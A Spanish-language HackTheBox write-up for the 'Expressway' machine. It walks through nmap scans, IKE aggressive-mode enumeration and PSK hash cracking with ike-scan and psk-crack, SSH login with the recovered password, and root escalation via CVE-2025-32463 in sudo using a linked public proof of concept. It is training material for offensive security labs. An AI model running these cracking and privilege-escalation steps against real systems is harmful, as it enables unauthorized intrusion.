---
layout: single
title: "Machines - Expressway (HTB)"
author_profile: true
published: true
toc: true
toc_sticky: true
comments: true
---

Las máquinas (de HackTheBox) son retos gamificados enfocados a __Red Team__ o por lo menos, __seguridad ofensiva__, donde tendrás que intentar __tomar control total__ de la máquina que tengas adelante abusando de vulnerabilidades practicando todo el proceso de _pentesting_ como la _obtención de información_, _explotación_ para obtener un _Foothold_, y luego seguir con generalmente, _movimiento lateral_ y finalmente, la _escalada de privilegios_; Estos laboratorios son especialmente útiles para probar conceptos de seguridad ofensiva ya que tendrás que abusar de ellos para seguir avanzando.

![UTMP]({{ "/images/expressway/logo.png" | relative_url }}){: .align-center}

## Resumen Expressway

Para inciar, en esta máquina __Linux__ estaremos utilizando el siguiente path de ataque:

1. __Enumeración__ - Un refrito, utilizar nmap, conocer la red y los servicios que se ejecutan.
2. __Explotación Isakmp__ - Estaremos abusando de `Isakamp`, utilizado para establecer `SA` de `IPSec`.
3. __Acceso inicial SSH__ - Obteniendo credenciales de `Isakamp` accedemos al objetivo y lo enumeramos, nada del otro mundo.
4. __Privilege Escalation con CVE-2025-32463__ - La enumeración muestra una vulnerabilidad en la versión de sudo que nos permite el _PE_.

Como podrán ver, bastante sencillita, algo tricky en la parte de VPN y negociación (si es que quieres entenderle) pero la verdad divertida.

## Laboratorio

### Enumeración

Como siempre, iniciamos con un análisis de `nmap` contra el objetivo: __Escaneando todos los puertos (-p-)__, __desabilitando la resolución dns (-n)__, __deshabilitando el ping scan (-Pn)__ (usado para determinar si el host está activo), __filtrando por sólo puertos abiertos (--open)__ y finalmente, __reportándolo en formato grepeable (-oG)__:

```js
❯ nmap -p- --min-rate 5000 -n -Pn 10.10.11.87 --open -oG allports

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-20 23:31 CST
Nmap scan report for 10.10.11.87
Host is up (0.20s latency).
Not shown: 65456 filtered tcp ports (no-response), 78 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 28.28 seconds

```

Parece que sólo está ejecutando SSH en la máquina; entonces, continuando con nuestra enumeración, utilizamos el motor de scripting de nmap para ejecutar __scripts por defecto (-sC)__  y __determinar la versión del servicio (-sV)__, claro, guardando el resultado en un archivo:

```js
❯ nmap -p22 -sCV -n -Pn 10.10.11.87 -oN Openports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-20 23:34 CST
Nmap scan report for 10.10.11.87
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
```

De este escaneo no podemos encontrar demasiado, ya que __OpenSSH 10.0p2__ es una versión actualizada, pero ¿Debemos tratar de hacer un bruteforce a SSH?, Es opción, pero si intentas, notarás que hay un límite de conexiones por SSH, así que no es rentable. 

¿Qué más podemos hacer?: Un escaneo __UDP__, realmente es raro hacer este tipo de escaneos pero dado que no tenemos muchas otras opciones, debemos intentarlo; entonces, lanzamos `nmap` para escanear (con `UDP`) los __100 puertos más usados__.

```js
❯ sudo nmap -sU --top-ports=100 -n -Pn 10.10.11.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 00:39 CST
Nmap scan report for 10.10.11.87
Host is up (0.25s latency).
Not shown: 93 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
500/udp   open          isakmp
1023/udp  open|filtered unknown
4500/udp  open|filtered nat-t-ike
32771/udp open|filtered sometimes-rpc6
49201/udp open|filtered unknown
```

### Isakmp

Realmente recomiendo leer la [el Todo Poderoso HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html) para entender un poco más de lo que vamos a hacer (igual lo explicaré lo mejor que pueda haha).

Cuando establecemos un canal de VPN utilizando IPSec, es necesario establecer un `SA` o _Security Association_, esto con el objetivo de poder intercambiar información de forma segura (y establecer un tunel seguro) y esto tiene varias fases:

1. Los participantes hacen un intercambio de llaves `DH` (_Deffie Hillman_) y obtienen su primera llave. (Aquí entra aggresive mode y Main mode, __Aggresive se utiliza para acelerar la negociación pero NO verifica la identidad de los pares y manda el usuario en texto claro__).
2. Luego ambos participantes deben confirmar su identidad (pueden ser varias como certificados... __PSK__) y añaden esta forma de verificación a su llave.
3. Para verificar que ambos tienen la misma llave, Aplican un algoritmo hash y lo envían.
4. El resultado, es que utilizan esta llave para cifrar todo el tráfico que envían entre ellos.

Cuando nosotros tenemos en frente este servicio, lo que queremos es obtener este hash y tratar de obtener todos los datos necesarios para poder abusar de él (ya sea para `sniffing` o `spoffing` de alguno de los participantes).

Con este objetivo en mente, iniciamos con el reconocimiento del servicio, donde utilizaremos `ike_scan` con los siguientes parámetros:

```js
❯ sudo ike-scan -M 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=0b15f14be4ac28be)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
Ending ike-scan 1.9.5: 1 hosts scanned in 60.330 seconds (0.02 hosts/sec).  1 returned handshake; 0 returned notify
```

Esto nos muestra la `transformación`, esto contiene información como qué algoritmo hash usa para verificar la llave y __cómo verican identidad__, en este caso: `Auth=PSK` que es muy beneficioso para nosotros (es más fácil atacarlo).

Pero antes de avanzar, debemos probar si el `Aggresive mode` está habilitado, si lo estám podemos interceptar al usuario.

```js
❯ sudo ike-scan -A 10.10.11.87              
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=99b1e7d04af429ab) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
```

Obteniendo un usuario!: `ike`

Para capturar el hash, necesitamos un `group name` válido y una transformación válida, la cual ya tenemos, podemos utilizar `ike-scan` y un pequeño one liner de bash para obtener el ID:

```js 
❯ while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line 10.10.11.87) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt
Found ID: EZ
Found ID: ez
Found ID: 3000
Found ID: 5000
Found ID: abc
```

Y luego elegimos algún ID (para saber si nos devuelve un hash, puedes probar con `sudo ike-scan -P -M -A -n ID 10.10.11.87`) y lo guardamos en un archivo para crackearlo con `psk-crack`.

```js
❯ sudo ike-scan -P -M -A -n 5000 --pskcrack=hash.txt 10.10.11.87
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=09efdfd76e4e19db)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)
```

Donde utilizando `rockyou.txt` obtendremos un hit.

```js
❯ psk-crack hash.txt -d /usr/share/wordlists/rockyou.txt 
Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 01805ae3f29bc14dad84cdcb42ea3e72e0e227b6
Ending psk-crack: 8045040 iterations in 6.211 seconds (1295384.11 iterations/sec)
```

### Acceso inicial SSH

Ahora, con usuario y contraseña, podemos acceder a `SSH`:

```js
❯ ssh ike@10.10.11.8702:57:42 [27/27]
ike@10.10.11.87's password:
<SNIP!>
ike@expressway:~$ ls
user.txt
```

Y hacemos lo de siempre, ver si podemos abusar de sudo:

```js
ike@expressway:~$ sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.
```

Vemos que no, pobamos con la versión de `su`:

```js
ike@expressway:~$ su -V
su from util-linux 2.41.1
```

No parece que haya algún exploit, pobamos con la de `sudo`

```js
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

### Privilege Escalation con CVE-2025-32463

`1.9.17` Explotable; Me parece que ya he explotado esta vulnerabilidad en alguno de los posts, pero si no, igual lo refresco hahaha:

El `CVE-2025-32463` es una vulnerabilidad de `sudo` por la forma en que utiliza `chroot`: El comand `sudo`, normalmente lee la configuración y decide si el usuario tiene permiso para realizar una acción, en versiones vulnerables, hubo un cambio donde `sudo` maneja la opción `chroot`, en lugar de verificar los permisos primero, resolvía las rutas dentro del entorno `chroot` especificado por el usuario.

Ahora, para que el programa pueda resolver nombres, se utilizan bibliotecas como `/etc/nsswitch.conf`, debido a la forma en que `sudo` procesaba el `chroot` el atacante puede crear un entorno `chroot` que incluyera una copia de `/etc/nsswitch.conf` y una biblioteca compartida (`.so`) diseñada para la explotación, mientras que el archivo `nsswitch.conf` del atacante fuerza a `sudo` a cargar la biblioteca maliciosa (__que es ejecutada con privilegios `root`__).

Entonces, es explotable a `CVE-2025-32463` donde ya hay un [PoC en github](https://github.com/kh4sh3i/CVE-2025-32463) que podemos usar tranquilamente; sólo hace falta copiarlo, pegarlo, ejecutarlo y Listo!.

```js
ike@expressway:~$ ls
sudo-chwoot.sh  user.txt
ike@expressway:~$ ./sudo-chwoot.sh 
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
root@expressway:/# 
```

Pwneando así obteniendo privilegios de `root`

###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!.
